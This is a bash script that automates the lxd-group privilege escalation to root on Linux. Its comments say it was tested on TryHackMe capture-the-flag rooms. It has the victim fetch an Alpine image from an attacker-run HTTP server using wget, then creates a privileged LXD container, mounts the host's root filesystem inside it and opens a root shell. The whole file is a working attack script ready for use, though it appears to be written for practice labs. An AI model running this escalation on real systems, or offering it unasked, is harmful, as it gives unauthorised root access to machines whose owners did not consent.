#!/bin/bash

#Tested on the following rooms on TryHackMe:
#gamingserver, colddboxeasy

#Transfer this file on the victim machine
#Our user must be part of the lxd group
#In some cases it may not spawn a root shell!

cd /tmp
echo "Execute the following commands on the attacker machine:"
echo "git clone https://github.com/saghul/lxd-alpine-builder.git"
echo "cd lxd-alpine-builder"
echo "./build-alpine"
echo "Wait for the program to finish. At the end you should get a new file called for example:"
echo "alpine-v3.18-x86_64-20221014_1303.tar.gz"
echo "Now start a Python server from where the new alpine file is: python3 -m http.server 5555"
echo "The default port of the http.server is set to 5555"
read -p "Attacker IP is (Example: 10.10.10.10): " AttackerIP
read -p "The new alpine file is called: " AlpineBuild
wget http://$AttackerIP:5555/$AlpineBuild
lxc image import $AlpineBuild --alias alpine
lxc image list
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc getroot disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc list
lxc exec privesc sh
